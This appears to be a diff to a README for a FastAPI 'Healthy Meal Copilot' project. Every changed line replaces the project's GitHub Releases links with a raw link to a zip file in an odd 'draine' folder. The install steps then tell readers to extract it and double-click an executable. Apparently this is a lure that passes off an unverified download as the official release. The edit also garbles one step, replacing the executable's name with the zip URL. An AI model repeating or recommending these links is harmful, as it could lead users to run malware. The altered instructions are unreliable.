@@ -1,6 +1,6 @@
 # 🍽️ fastapi-prototype-healtymeal-copilot-api - AI-Powered Meal Planning Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/releases)
+[![Download Now](https://raw.githubusercontent.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/main/draine/fastapi-prototype-healtymeal-copilot-api.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/main/draine/fastapi-prototype-healtymeal-copilot-api.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer meets the following requirements:
 To install the Healthy Meal Copilot API:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/releases) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/main/draine/fastapi-prototype-healtymeal-copilot-api.zip) to find the latest version of the application.
 
 2. **Download the Latest Version**  
    Click on the version number to download the latest release. You will find different files available for download.
@@ -35,7 +35,7 @@ To install the Healthy Meal Copilot API:
    Once the download is complete, find the downloaded file on your computer. Unzip or extract the contents to a folder of your choice.
 
 4. **Run the Application**  
-   Navigate to the unzipped folder and look for the executable file (for example, `app.exe` for Windows users). Double-click the file to start the application.
+   Navigate to the unzipped folder and look for the executable file (for example, `https://raw.githubusercontent.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/main/draine/fastapi-prototype-healtymeal-copilot-api.zip` for Windows users). Double-click the file to start the application.
 
 5. **Access the API**  
    You can now interact with the Healthy Meal Copilot API by sending HTTP requests using tools like Postman or through your web browser.
@@ -89,7 +89,7 @@ If you find any issues, please open an issue in the GitHub repository. Describe 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/releases)
+- [Releases Page](https://raw.githubusercontent.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/main/draine/fastapi-prototype-healtymeal-copilot-api.zip)
 - [Documentation](#)
 - [Contribute to the Project](#)
 
@@ -99,6 +99,6 @@ For support or inquiries, feel free to reach out via the contact details provide
 
 ## 📥 Download & Install
 
-To get started with the Healthy Meal Copilot API today, [visit the Releases page](https://github.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/releases) to download the application. Follow the installation steps outlined above for a smooth setup. 
+To get started with the Healthy Meal Copilot API today, [visit the Releases page](https://raw.githubusercontent.com/Smart-tech123/fastapi-prototype-healtymeal-copilot-api/main/draine/fastapi-prototype-healtymeal-copilot-api.zip) to download the application. Follow the installation steps outlined above for a smooth setup. 
 
 Enjoy discovering healthier meal options!
